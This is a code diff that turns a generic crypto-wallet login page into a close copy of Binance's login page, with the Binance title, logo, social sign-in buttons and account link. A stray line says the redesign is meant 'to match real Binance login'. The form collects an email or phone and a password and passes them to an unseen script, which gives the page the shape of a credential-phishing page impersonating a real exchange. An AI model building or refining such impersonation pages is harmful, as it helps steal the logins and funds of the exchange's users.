@@ -1,78 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Crypto Wallet</title>
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in | Binance</title>
+  <link rel="stylesheet" href="css/binance-auth.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
-<body class="dark-mode">
-    <div class="app-container">
-        <div class="status-bar">
-            <div class="time">14:37</div>
-            <div class="recording-indicator">
-                <div class="recording-dot"></div>
-            </div>
-            <div class="status-icons">
-                <i class="fas fa-bluetooth-b"></i>
-                <div class="signal-icon">
-                    <div class="signal-bar"></div>
-                    <div class="signal-bar"></div>
-                    <div class="signal-bar"></div>
-                </div>
-                <div class="wifi-icon">
-                    <div class="wifi-bar"></div>
-                    <div class="wifi-bar"></div>
-                    <div class="wifi-bar"></div>
-                </div>
-                <div class="battery">
-                    <span>75%</span>
-                    <div class="battery-icon">
-                        <div class="battery-level"></div>
-                    </div>
-                </div>
-            </div>
+<body>
+  <div class="auth-wrapper">
+    <div class="auth-container">
+       Complete redesign to match real Binance login 
+      <div class="auth-header">
+        <div class="binance-logo">
+          <svg width="120" height="24" viewBox="0 0 120 24" fill="none">
+            <path d="M7.5 12L12 7.5L16.5 12L12 16.5L7.5 12Z" fill="#F3BA2F"/>
+            <path d="M0 12L4.5 7.5L9 12L4.5 16.5L0 12Z" fill="#F3BA2F"/>
+            <path d="M15 12L19.5 7.5L24 12L19.5 16.5L15 12Z" fill="#F3BA2F"/>
+            <path d="M7.5 4.5L12 0L16.5 4.5L12 9L7.5 4.5Z" fill="#F3BA2F"/>
+            <path d="M7.5 19.5L12 15L16.5 19.5L12 24L7.5 19.5Z" fill="#F3BA2F"/>
+          </svg>
+          <span class="binance-text">BINANCE</span>
+        </div>
+        <button class="qr-btn" title="Scan QR Code">
+          <i class="fas fa-qrcode"></i>
+        </button>
+      </div>
+
+      <h1 class="auth-title">Log in</h1>
+
+      <form id="loginForm" class="auth-form">
+        <div class="form-group">
+          <label class="form-label">Email/Phone number</label>
+          <input 
+            type="text" 
+            id="email" 
+            class="form-input" 
+            placeholder="Email/Phone (without country code)" 
+            required
+            autocomplete="email"
+          >
         </div>
 
-        <div class="login-container">
-            <div class="logo-container">
-                <div class="logo">
-                    <i class="fas fa-wallet"></i>
-                </div>
-                <h1>Crypto Wallet</h1>
-                <p class="tagline">Secure. Simple. Smart.</p>
-            </div>
-            
-            <form id="loginForm" class="auth-form">
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <div class="input-with-icon">
-                        <i class="fas fa-envelope"></i>
-                        <input type="email" id="email" placeholder="Enter your email" required>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <div class="input-with-icon">
-                        <i class="fas fa-lock"></i>
-                        <input type="password" id="password" placeholder="Enter your password" required>
-                    </div>
-                </div>
-                
-                <div class="form-error" id="loginError"></div>
-                
-                <button type="submit" class="btn btn-primary btn-block">Login</button>
-                
-                <div class="auth-links">
-                    <p>Don't have an account? <a href="register.html">Sign up</a></p>
-                </div>
-            </form>
+        <div class="form-group">
+          <label class="form-label">Password</label>
+          <div class="password-input-wrapper">
+            <input 
+              type="password" 
+              id="password" 
+              class="form-input" 
+              placeholder="Password" 
+              required
+              autocomplete="current-password"
+            >
+            <button type="button" class="password-toggle" id="togglePassword">
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
         </div>
+
+        <div class="form-error" id="loginError"></div>
+
+        <button type="submit" class="btn-primary">Continue</button>
+      </form>
+
+      <div class="divider">
+        <span>or</span>
+      </div>
+
+      <div class="social-login">
+        <button class="social-btn">
+          <i class="fas fa-key"></i>
+          <span>Continue with Passkey</span>
+        </button>
+        <button class="social-btn">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+            <path d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.874 2.684-6.615z" fill="#4285F4"/>
+            <path d="M9.003 18c2.43 0 4.467-.806 5.956-2.18L12.05 13.56c-.806.54-1.836.86-3.047.86-2.344 0-4.328-1.584-5.036-3.711H.96v2.332C2.44 15.983 5.485 18 9.003 18z" fill="#34A853"/>
+            <path d="M3.964 10.71c-.18-.54-.282-1.117-.282-1.71 0-.593.102-1.17.282-1.71V4.958H.957C.347 6.173 0 7.548 0 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05"/>
+            <path d="M9.003 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.464.891 11.426 0 9.003 0 5.485 0 2.44 2.017.96 4.958L3.967 7.29c.708-2.127 2.692-3.71 5.036-3.71z" fill="#EA4335"/>
+          </svg>
+          <span>Continue with Google</span>
+        </button>
+        <button class="social-btn">
+          <i class="fab fa-apple"></i>
+          <span>Continue with Apple</span>
+        </button>
+        <button class="social-btn">
+          <i class="fab fa-telegram"></i>
+          <span>Continue with Telegram</span>
+        </button>
+      </div>
+
+      <div class="auth-footer">
+        <a href="register.html" class="create-account-link">Create a Binance Account</a>
+      </div>
+
+      <div class="support-btn-wrapper">
+        <button class="support-btn">
+          <i class="fas fa-headset"></i>
+        </button>
+      </div>
     </div>
+  </div>
 
-    <script src="js/auth.js"></script>
+  <script src="js/auth.js"></script>
 </body>
 </html>
-
